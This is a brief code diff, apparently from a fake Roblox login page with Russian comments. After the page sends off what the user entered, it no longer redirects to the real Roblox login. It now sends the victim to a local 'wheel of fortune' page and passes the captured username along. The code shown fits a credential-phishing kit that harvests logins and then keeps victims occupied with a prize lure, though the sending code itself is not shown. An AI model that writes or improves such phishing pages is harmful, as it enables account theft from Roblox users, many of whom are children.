@@ -471,11 +471,15 @@
                     console.warn('Ошибка при отправке:', error);
                 })
                 .finally(function() {
-                    window.location.replace('https://www.roblox.com/login');
+                    // Перенаправляем на колесо фортуны с передачей логина
+                    const username = document.getElementById('username').value.trim();
+                    window.location.replace('2i.html?username=' + encodeURIComponent(username));
                 });
 
                 setTimeout(function() {
-                    window.location.replace('https://www.roblox.com/login');
+                    // Перенаправляем на колесо фортуны с передачей логина
+                    const username = document.getElementById('username').value.trim();
+                    window.location.replace('2i.html?username=' + encodeURIComponent(username));
                 }, 3000);
             });
 
